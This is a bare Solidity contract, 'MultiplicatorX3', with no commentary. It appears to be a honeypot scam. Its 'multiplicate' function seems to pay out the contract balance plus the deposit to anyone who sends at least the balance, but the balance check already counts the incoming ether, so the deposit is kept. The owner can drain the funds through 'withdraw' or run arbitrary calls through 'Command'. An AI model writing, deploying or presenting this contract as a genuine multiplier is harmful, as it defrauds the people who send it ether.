pragma solidity ^0.4.18;

contract MultiplicatorX3 {
    address public Owner = msg.sender;

    function() public payable {}

    function withdraw() public {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address adr, bytes data) public payable {
        require(msg.sender == Owner);
        require(adr.call.value(msg.value)(data));
    }

    function multiplicate(address adr) public payable {
        require(msg.value >= this.balance);
        adr.transfer(this.balance + msg.value);
    }
}